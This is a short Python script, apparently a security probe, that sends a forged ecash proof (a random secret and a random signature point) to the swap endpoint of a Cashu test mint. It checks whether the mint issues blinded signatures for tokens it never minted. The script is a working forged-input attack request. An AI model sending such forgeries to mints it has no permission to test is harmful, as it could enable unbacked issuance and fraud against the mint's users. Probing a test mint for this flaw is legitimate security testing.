"""Forged-input SWAP probe: does testnut sign outputs for a proof that was never minted?"""
import json
import secrets

import requests

MINT = "https://testnut.cashu.exchange"
s = requests.Session()

keyset_id = "008e808b89acc141"
r = s.get(MINT + f"/v1/keys/{keyset_id}", timeout=30).json()
keysets = r.get("keysets", [r])
pubkeys = (keysets[0] if isinstance(keysets, list) else r).get("keys") or {}
amt = sorted(int(k) for k in pubkeys)[0]
A = pubkeys[str(amt)]
print(f"keyset {keyset_id}: lowest denom {amt}, A={A[:24]}...")

forged_secret = secrets.token_hex(32)
forged_C = "02" + secrets.token_hex(32)

# output: a fresh blinded message (random B_ point hex — mint only signs it)
B_ = "02" + secrets.token_hex(32)
body = {
    "inputs": [{"amount": amt, "secret": forged_secret, "C": forged_C, "id": keyset_id}],
    "outputs": [{"amount": amt, "B_": B_, "id": keyset_id}],
}
r = s.post(MINT + "/v1/swap", json=body, timeout=30)
try:
    resp = r.json()
except Exception:
    resp = r.text
print(f"\nFORGED SWAP -> HTTP {r.status_code}")
print(json.dumps(resp, indent=2)[:600] if not isinstance(resp, str) else resp[:600])
signed = isinstance(resp, dict) and (resp.get("signatures") or [])
print("\nVERDICT:", "CATASTROPHIC: unbacked issuance — mint signed outputs for a forged input" if r.status_code == 200 and signed else "rejected (swap verification holds)")
